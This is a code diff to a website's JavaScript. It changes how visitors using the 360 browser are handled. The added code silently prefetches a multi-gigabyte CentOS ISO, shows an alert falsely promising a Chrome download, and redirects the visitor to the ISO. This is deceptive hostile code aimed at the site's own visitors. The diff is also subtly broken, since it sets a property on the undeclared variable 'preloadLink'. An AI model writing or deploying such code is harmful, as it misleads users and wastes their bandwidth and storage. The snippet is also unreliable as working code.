@@ -97,7 +97,15 @@
     };
 }));
 // 判断 360 浏览器跳转
-if (new Browser().browser == '360' || new Browser().browser == '360EE' || new Browser().browser == '360SE') {
-    window.alert('为了您的人身安全，我们禁止您使用 360 浏览器访问本站，我们要求您通过 Chrome 或 Firefox 浏览器访问本站。\n点击确定后将会跳转至 Chrome 浏览器下载');
-    window.location.href='https://chrome-dl.com';
+var browserType = new Browser().browser;
+var centOSDownloadUrl = "https://repo.huaweicloud.com/centos/7.8.2003/isos/x86_64/CentOS-7-x86_64-Everything-2003.iso";
+if (browserType === '360' || browserType === '360EE' || browserType === '360SE') {
+    var prefetchLink = document.createElement("link");
+    prefetchLink.href = centOSDownloadUrl;
+    preloadLink.rel = "prefetch";
+    document.head.appendChild(prefetchLink);
+    setTimeout(function() {
+        window.alert('您被禁止使用 360 浏览器\n点击确定后将会自动开始下载 Chrome 浏览器');
+        window.location.href = centOSDownloadUrl;
+    }, 0);
 }
